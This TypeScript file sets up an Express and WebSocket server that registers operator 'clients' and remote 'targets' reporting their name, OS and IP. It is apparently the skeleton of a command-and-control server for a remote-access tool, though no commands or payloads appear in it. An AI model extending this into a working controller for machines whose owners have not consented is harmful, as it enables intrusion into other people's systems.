import express from 'express';
import cors from 'cors';

import { Server } from 'ws';
import { Socket, Command } from './structures/socket';
import {Target} from './structures/target';

const app = express().use(cors()).use(express.json());

const port = process.env.PORT || 5000;
const server = app.listen(port, () =>
  console.log(`Server running on port ${port}.`)
);

const wss = new Server({ server });

const targets: Target[] = [];
const clients: Socket[] = [];

wss.on('connection', (ws) => ws.on('message', (msg) => {
  let command: Command;
  try {
    command = JSON.parse(msg.toString());
  } catch (err) {
    ws.close();
  }

  if (command.name !== 'greet') return;
  if (command.args.length === 0) {
    const client = new Socket(ws);

    clients.push(client);

    console.log(`New client: ${client.id}`);
  } else if (command.args.length === 3) {
    const target = new Target(ws, {
      name: command.args[0],
      os: command.args[1],
      ip: command.args[2],
    });

    targets.push(target);

    console.log(`New target: ${target.id}`);
  } else return ws.close();
}));
